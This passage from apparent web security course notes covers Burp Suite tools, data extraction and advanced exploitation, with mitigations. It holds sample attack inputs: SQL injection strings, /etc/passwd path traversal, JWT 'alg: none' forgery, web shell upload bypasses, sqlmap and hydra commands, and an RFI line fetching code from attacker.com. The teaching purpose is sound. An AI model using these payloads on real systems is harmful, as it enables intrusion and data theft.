- *Use cases*: brute-force login pages (usernames/passwords); fuzzing parameters to find injection points; enumerating IDs, usernames, or resources (e.g., `/user/1`, `/user/2`, …); testing rate limiting and lockout mechanisms.
- *Community vs. Pro*: Community edition has throttling (slower); Pro edition allows full-speed and more advanced configurations.

**Repeater**
- *Purpose*: manually modify and resend individual HTTP requests for detailed testing.
- *How it works*: send a request from Proxy (or elsewhere) to Repeater; edit any part (method, URL, headers, parameters, body); resend and compare responses.
- *Use cases*: test how the server reacts to modified inputs; manually exploit injection points discovered via Proxy/Scanner; craft precise payloads for SQLi, XSS, command injection, etc.; test access control by changing IDs, roles, or tokens.
- *Why it's useful*: gives fine-grained control for precise, manual exploitation and validation.

**Sequencer**
- *Purpose*: analyzes the randomness and quality of session tokens or other sensitive data items (e.g., CSRF tokens, password reset tokens).
- *How it works*: collects a large sample of tokens (e.g., 500–2000) and performs statistical tests to check entropy, predictability, and patterns/biases.
- *Output*: graphs and metrics showing token quality; assessment of whether tokens are sufficiently random.
- *Use cases*: evaluate session management security; check if tokens can be guessed or predicted; support findings for weak token generation.
- *Security relevance*: weak tokens can lead to session hijacking, account takeover, or CSRF bypass.

**Decoder**
- *Purpose*: encodes and decodes data in various formats, useful for working with encoded payloads and responses.
- *Supported transformations*: URL encoding/decoding; HTML entity encoding/decoding; Base64 encode/decode; hex encode/decode; ASCII/UTF-8 conversions; hashing (MD5, SHA-1, SHA-256, etc.).
- *Use cases*: decode obfuscated payloads in responses; prepare encoded payloads for injection testing; analyze suspicious strings (tokens, encoded parameters); quickly hash strings for testing password fields or signatures.

**Comparer**
- *Purpose*: diff tool for comparing two pieces of data — requests, responses, tokens, or any text.
- *How it works*: "add to comparer" two items (e.g., two responses); Comparer shows a side-by-side or unified diff with highlighted differences (added/removed/changed bytes).
- *Use cases*: compare responses for different inputs to detect successful vs. failed login, presence/absence of error messages, or subtle changes indicating injection success; analyze token differences over time; identify fingerprintable differences in behavior.
- *Security relevance*: helps spot small but critical differences that indicate vulnerabilities.

### 5.3 Additional Useful Features (Brief)
- **Target tab**: shows site map (all discovered URLs, parameters, etc.); organizes scope.
- **Logger / Dashboard (Pro)**: central view of all issues found by Scanner, with filtering and reporting.
- **Collaborator (Pro)**: provides unique domains/IPs to detect out-of-band interactions (DNS/HTTP callbacks) for blind vulnerabilities like blind SQLi, XXE, SSRF.
- **Extensions (BApp Store)**: community and official plugins to extend functionality (additional scanners, integrations, custom tools).
- **Match and Replace**: define rules to automatically modify requests/responses (e.g., add headers, strip cookies).
- **Session handling**: manage tokens, macros, and session rules for complex apps (e.g., auto-refresh tokens).

### 5.4 Why Use Burp Suite?
- **Centralized platform**: combines proxy, scanner, manual testing tools, and utilities in one interface.
- **Manual + automated testing**: supports both deep manual analysis and faster automated scanning.
- **Deep visibility**: full control over HTTP/HTTPS traffic.
- **Flexible and extensible**: customizable workflows, extensions, and scripting.
- **Industry standard**: widely used in professional pentesting, bug bounty programs, and security research.

**Typical workflow**:
1. Configure browser to use Burp Proxy.
2. Crawl the app (Spider/Crawler) to map structure.
3. Use Proxy/Repeater to test inputs and logic manually.
4. Run Scanner (Pro) to find common issues.
5. Use Intruder for brute forcing and fuzzing.
6. Use Decoder/Comparer/Sequencer for specialized analysis.
7. Document findings and provide remediation guidance.

---

# SESSION 4

## 1. Data Extraction

Data extraction in web application security refers to the unauthorized retrieval of sensitive information from a system by exploiting vulnerabilities. This is a primary goal in many attacks, as stolen data (credentials, PII, financial records) can be sold, used for fraud, or enable further compromise.

### 1.1 Definition and Impact

**Definition**: The act of retrieving sensitive data from a web application by exploiting vulnerabilities in the application's logic, configuration, or code.

**What attackers target**:
- **User credentials**: usernames, password hashes, API keys.
- **Personal Identifiable Information (PII)**: names, addresses, phone numbers, Aadhaar numbers.
- **Financial data**: credit card numbers, transaction history, bank account details.
- **Business data**: internal configs, source code snippets, proprietary logs.

**Impact**:
- **Confidentiality breach**: private data becomes public or accessible to unauthorized parties.
- **Financial loss**: direct theft, fraud, or regulatory fines (GDPR, DPDP Act).
- **Reputational damage**: loss of user trust and brand value.
- **Further compromise**: stolen credentials allow lateral movement or admin access.

### 1.2 Key Vectors for Data Extraction

**SQL Injection (SQLi)**
- *Mechanism*: injecting malicious SQL code into input fields (forms, URL parameters) to manipulate the backend database query.
- *How data is extracted*: **Union-based** — using `UNION SELECT` to append results from other tables (e.g., `users`, `passwords`) to the visible output; **Blind SQLi** — inferring data character-by-character by observing true/false responses or time delays (e.g., `IF(1=1, SLEEP(5), 0)`); **Error-based** — triggering database errors that reveal schema information or data in the error message.
- *Example*: Input `' UNION SELECT username, password FROM users --` causes the login page to display a list of all usernames and password hashes.

**Directory Traversal (Path Traversal)**
- *Mechanism*: manipulating file paths (e.g., using `../`) to access files outside the intended web root directory.
- *How data is extracted*: accessing configuration files (`/etc/passwd`, `web.config`, `.env`); reading source code backups (`.bak`, `.old`); accessing logs that may contain sensitive session data or user activity.
- *Example*: `http://site.com/download?file=../../../etc/passwd` returns the system password file.

**Insecure Direct Object References (IDOR)**
- *Mechanism*: accessing internal implementation objects (database records, files) by manipulating parameter values that directly reference them.
- *How data is extracted*: changing an ID in a URL (e.g., `user_id=100` → `user_id=101`) to view another user's profile; downloading invoices/documents belonging to other users by guessing filenames or IDs.
- *Example*: `http://site.com/invoice?id=5001` changed to `?id=5002` lets the attacker download a different user's invoice with their address and financial info.

**Broken Access Control**
- *Mechanism*: failure to properly enforce restrictions on what authenticated users are allowed to do.
- *How data is extracted*: regular users accessing admin-only endpoints (e.g., `/api/admin/users`); accessing API endpoints directly without UI restrictions; bypassing client-side checks to view hidden data fields.
- *Example*: a GET request to `/api/v1/users` without admin privileges returns the full user list because the server didn't check roles.

**Server-Side Template Injection (SSTI)**
- *Mechanism*: injecting template expressions into a server-side template engine (e.g., Jinja2, Twig, Freemarker) which are then executed on the server.
- *How data is extracted*: executing arbitrary code on the server to read environment variables; accessing the file system to read sensitive files; dumping database contents via template functions.
- *Example*: input `{{ config.items() }}` in a Flask/Jinja2 app renders the entire application configuration, potentially revealing secret keys and DB credentials.

### 1.3 Example Scenario: SQLi Data Extraction

**Vulnerability**: A login form constructs a query like:
`SELECT * FROM users WHERE username = '$input' AND password = '$pass'`

**Attack**:
1. Attacker enters `' OR '1'='1` in the username field.
2. The query becomes: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`
3. Since `'1'='1'` is always true, the query returns the first user (often admin).
4. **Advanced extraction**: using `UNION SELECT`, the attacker modifies the input to: `' UNION SELECT 1, username, password FROM users --`
5. The application displays the result, inadvertently showing all usernames and passwords.

### 1.4 Mitigations

Preventing data extraction requires a defense-in-depth approach.

**Input Validation**
- **Allowlisting**: accept only known good characters (e.g., alphanumeric for usernames).
- **Sanitization**: escape special characters that could be interpreted as code (quotes, semicolons).
- **Type checking**: ensure numeric inputs are actually numbers.

**Parameterized Queries (Prepared Statements)**
- *Mechanism*: the database treats user input as data, not executable code.
- Example (Python/SQL):
  ```python
  cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
  ```
- *Benefit*: completely neutralizes SQL injection attempts.

**Least Privilege Access**
- **Database accounts**: the web app should connect with an account that has only necessary permissions (e.g., `SELECT` only, no `DROP` or `FILE`).
- **File system**: web server processes should not have read access to sensitive system files (e.g., `/etc/shadow`).
- **API access**: enforce strict role-based access control (RBAC) on all endpoints.

**Monitoring and Logging**
- **Log access**: record who accessed what data and when.
- **Alerting**: trigger alerts on suspicious patterns (bulk data downloads, repeated 403 errors, SQL error messages).
- **Audit trails**: maintain immutable logs for forensic analysis after a breach.

**Secure Configuration**
- **Disable verbose errors**: prevent stack traces or SQL errors from being shown to users.
- **Restrict file access**: ensure web roots are properly isolated from system files.

### 1.5 Related OWASP Top 10 Risks

| OWASP ID | Risk Name | Relevance to Data Extraction |
|---|---|---|
| A01:2021 | Broken Access Control | Allows attackers to access data belonging to other users or admin data. |
| A03:2021 | Injection | SQLi, NoSQLi, and OS command injection allow direct database or file system access. |
| A04:2021 | Insecure Design | Flaws like IDOR often stem from poor design of resource references. |
| A05:2021 | Security Misconfiguration | Default credentials, exposed cloud storage, or verbose errors leak sensitive info. |

### 1.6 Tools Used for Data Extraction

**SQLMap**
- *Purpose*: automated SQL injection and database takeover tool.
- *Features*: detects SQLi vulnerabilities automatically; extracts database schema, tables, and columns; dumps entire tables (e.g., `--dump` flag); can execute OS commands on the DB server (if privileges allow).
- *Usage*: `sqlmap -u "http://site.com/page?id=1" --dbs`

**Burp Suite**
- **Intruder**: automates enumeration of IDs (for IDOR) or brute-forcing parameters.
- **Repeater**: manually crafts payloads to extract data via SQLi or SSTI.
- **Scanner (Pro)**: automatically detects vulnerabilities that lead to data leaks.
- **Proxy**: intercepts traffic to analyze how data is returned and identify leakage points.

**Hydra**
- *Purpose*: fast network login cracker (brute-forcing).
- *Usage in data extraction*: used to gain initial access by guessing credentials; once logged in, attackers can access user data directly through the app.
- *Example*: `hydra -l admin -P passwords.txt http-post-form`

**Manual Exploitation (Intercepting Proxies)**
- *Technique*: using tools like Burp or ZAP to manually modify requests.
- *Use cases*: changing `user_id` parameters to test for IDOR; modifying API calls to access admin endpoints; analyzing responses for hidden data fields or verbose error messages.

---

## 2. Advanced Identification and Exploitation

Advanced identification and exploitation refers to the use of sophisticated, often manual or semi-automated techniques to discover and leverage vulnerabilities that basic automated scanners typically miss. These methods focus on understanding application behavior, business logic, and complex interaction patterns to achieve deeper compromise.

### 2.1 Definition and Context

**Definition**: Advanced techniques used to identify and exploit vulnerabilities beyond basic scans, often employed during manual or semi-automated penetration tests, red team engagements, or bug bounty hunting.

**Why basic scans fail**:
- Automated tools (e.g., standard DAST) rely on known patterns and signatures.
- They struggle with:
  - **Business logic flaws**: the app works as coded, but the logic is insecure.
  - **Multi-step attacks**: vulnerabilities that require chaining multiple issues.
  - **Context-aware issues**: problems that depend on specific user roles, states, or workflows.

**Goal of advanced exploitation**: bypass security controls (WAF, input filters); chain minor issues into critical vulnerabilities; achieve objectives like full system compromise (RCE), data exfiltration, or privilege escalation.

### 2.2 Common Advanced Techniques

**Business Logic Attacks**
- *What it is*: exploiting flaws in the application's workflow or decision-making process rather than technical bugs like injection.
- *Common scenarios*: **Price manipulation** — changing item price parameters during checkout (e.g., `price=100` → `price=1`); **Quantity abuse** — entering negative quantities to get refunds or free items; **Workflow bypass** — skipping steps in a multi-step process (e.g., jumping from "Cart" directly to "Order Confirmation" without payment); **Rate limiting bypass** — exploiting lack of limits on actions like password resets or OTP generation.
- *Example*: an e-commerce app applies discounts based on a client-side parameter; an attacker modifies it to apply a 100% discount, purchasing items for free.
- *Why scanners miss it*: the application returns `200 OK` and functions normally — there's no technical error, just a flawed business rule.

**Chained Exploits**
- *What it is*: combining multiple low- or medium-severity vulnerabilities to achieve a high-impact exploit.
- *Common chains*:
  - **WAF Bypass + SQLi**: identify that the WAF blocks standard SQLi payloads (e.g., `UNION SELECT`) → use encoding, chunking, or alternative syntax to bypass the WAF → successfully execute SQLi to extract data.
  - **XSS + CSRF**: use XSS to steal a victim's session token → use that token to perform CSRF actions on their behalf.
  - **IDOR + Password Reset**: use IDOR to enumerate valid usernames/emails → trigger password resets for those accounts and intercept/reset tokens.
- *Example*: an attacker finds an open redirect (low severity) and uses it to make a phishing link appear legitimate, then combines it with credential harvesting to gain access.

**Authentication/Authorization Bypass**
- *What it is*: techniques to circumvent login mechanisms or access controls without valid credentials or privileges.
- *Methods*: **Parameter tampering** — changing `is_admin=false` to `is_admin=true` in a cookie or request; **SQLi in login** — using `' OR '1'='1` to bypass authentication entirely; **JWT manipulation** — changing the algorithm to `none` to skip signature verification, or modifying payload claims (e.g., `role: user` → `role: admin`) without a valid signature; **Session fixation** — forcing a user to use a known session ID, then hijacking it after they log in; **Mass assignment** — binding unexpected parameters (e.g., `role=admin`) during user registration or profile updates.
- *Example*: a JWT token is signed with HS256; the attacker changes the header to `alg: none`, removes the signature, and the server accepts the forged admin token.

**LFI/RFI Exploitation**
- **LFI (Local File Inclusion)**: including files that already exist on the server. *Technique*: manipulating file path parameters (e.g., `?page=../../etc/passwd`). *Goal*: read sensitive files (configs, source code, logs) to gather info for further attacks. *Advanced*: using LFI to read log files, then injecting PHP code into logs (via User-Agent) and including them to achieve RCE.
- **RFI (Remote File Inclusion)**: including files from a remote server controlled by the attacker. *Requirement*: `allow_url_include` must be enabled in PHP (rare in modern setups). *Technique*: `?page=http://attacker.com/shell.txt`. *Goal*: execute arbitrary code hosted on the attacker's server.
- *Example (LFI to RCE)*: attacker uses LFI to read `/var/log/apache2/access.log`; sends a request with a malicious PHP payload in the User-Agent header; includes the log file via LFI, executing the payload.

**File Upload Bypass & Remote Code Execution (RCE)**
- *What it is*: bypassing restrictions on file upload functionality to upload and execute malicious scripts (web shells).
- *Common bypass techniques*: **Extension bypass** — trying alternative extensions (`.php5`, `.phtml`, `.php.jpg`), case variations (`.PhP`), null byte injection (`.php%00.jpg` in older systems); **MIME type spoofing** — changing `Content-Type` from `text/php` to `image/jpeg` while uploading a PHP file; **Magic byte injection** — adding GIF/PNG headers (`GIF89a`) at the start of a PHP file to trick image checks; **Path traversal in upload** — uploading to unintended directories (e.g., `../../uploads/shell.php`).
- *RCE execution*: once uploaded, the attacker accesses the file via browser (e.g., `http://site.com/uploads/shell.php`) and executes system commands.
- *Example*: a profile picture upload allows `.jpg` only; the attacker uploads `shell.php.jpg` with a valid JPEG header but PHP code inside, and the server misconfigures execution, running the PHP code.

### 2.3 Real-World Example: Chained Exploitation

**Scenario**: A web application allows users to upload profile images.

1. **Reconnaissance (Burp Proxy)**: intercept the upload request; identify that the server checks file extension and `Content-Type`.
2. **Fuzzing (Burp Intruder)**: test various extensions (`.php`, `.php5`, `.phtml`, `.php.jpg`); discover that `.phtml` is not blocked.
3. **Bypass validation**: create `shell.phtml` containing PHP code; add GIF header (`GIF89a`) to bypass image content checks; set `Content-Type: image/jpeg`.
4. **Upload & access**: upload the file successfully; access `http://site.com/uploads/shell.phtml`.
5. **RCE**: use the web shell to execute commands (`whoami`, `cat /etc/passwd`, download database dumps).

**Impact**: full server compromise, data exfiltration, potential lateral movement to internal systems.

### 2.4 Mitigations

**Secure Coding Practices**
- Input validation: strictly validate all user inputs (type, length, format, range).
- Output encoding: encode data before rendering to prevent injection.
- Least privilege: run applications with minimal permissions; restrict file system access.
- Secure defaults: disable dangerous features (e.g., `allow_url_include`, directory listing).

**Security Testing (SAST, DAST, IAST)**
- **SAST**: scan source code for patterns like insecure file handling or weak crypto.
- **DAST**: test running applications for vulnerabilities (though limited for logic flaws).
- **IAST**: combines SAST and DAST by instrumenting the app during runtime for more accurate results.
- **Manual penetration testing**: essential for finding business logic flaws and chained exploits.

**Bug Bounty Programs**
- **Crowdsourced security**: engage external researchers to find advanced vulnerabilities.
- **Incentives**: monetary rewards encourage deep, creative testing.
- **Continuous testing**: ongoing program rather than one-time audit.

**Strong Input Validation & Sanitization**
- **Allowlists**: accept only known-good values (e.g., specific file extensions like `.jpg`, `.png`).
- **Re-encoding**: normalize input before validation to prevent bypasses.
- **Server-side checks**: never trust client-side validation alone.
- **File upload security**: store uploads outside the web root; use random filenames (UUIDs); verify file content (magic bytes), not just extension or MIME type; disable script execution in upload directories.

### 2.5 Related OWASP Top 10 Risks

| OWASP ID | Risk Name | Relevance to Advanced Exploitation |
|---|---|---|
| A01:2021 | Broken Access Control | Enables authorization bypass and IDOR attacks. |
| A03:2021 | Injection | Foundation for SQLi, SSTI, and command injection chains. |
| A05:2021 | Security Misconfiguration | Enables file upload RCE, LFI/RFI, and exposure of sensitive endpoints. |
| A07:2021 | Identification and Authentication Failures | Allows auth bypass, session hijacking, and privilege escalation. |
| A09:2021 | Security Logging and Monitoring Failures | Allows attackers to operate undetected during advanced exploitation. |

### 2.6 Key Takeaways for Advanced Testing
- **Think like an attacker**: don't just test inputs — test workflows, assumptions, and edge cases.
- **Chain small issues**: a minor info leak + a weak access check = critical breach.
- **Manual testing is irreplaceable**: automated tools cannot replicate human creativity in logic attacks.
- **Defense in depth**: no single control is enough; combine validation, auth, logging, and monitoring.
